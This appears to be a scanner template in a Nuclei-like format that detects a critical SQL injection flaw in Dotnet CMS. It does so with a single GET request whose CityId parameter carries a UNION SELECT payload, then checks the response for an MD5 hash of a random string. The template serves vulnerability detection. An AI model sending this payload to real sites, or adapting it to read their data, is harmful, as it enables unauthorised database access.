id: dotnetcms-sqli
brief:
    title: Dotnet CMS - SQL Injection
    by: ritikchaddha
    level: critical
    about: Dotnet CMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the cont...
    label:
        - dotnetcms
        - dotnet
        - sqli
        - intrusive
        - vuln
    score: CVSS:10.0
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/user/City_ajax.aspx?CityId=33''union%20select%20sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''{{randstr}}'')),2--'
      signs:
        - "on": word
          has:
            - '{{md5("{{randstr}}")}}'
          in: body
          need: all
        - "on": status
          status:
            - 200
